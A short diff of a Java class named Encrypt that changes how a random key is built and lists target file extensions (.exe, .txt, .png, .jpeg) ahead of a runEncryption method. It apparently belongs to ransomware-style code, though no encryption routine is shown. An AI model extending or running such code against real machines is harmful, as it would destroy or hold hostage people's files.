@@ -13,7 +13,7 @@ import java.util.UUID;
 
 public class Encrypt {
 
-    private static final String KEY = UUID.randomUUID().toString().replaceAll("-", "").substring(0, 32);;
+    private static final String KEY = UUID.randomUUID().toString().replaceAll("-", "");;
     private static final String[] EXTENSIONS = new String[]{".exe", ".txt", ".png", ".jpeg"};
 
     public static void runEncryption() throws Exception {
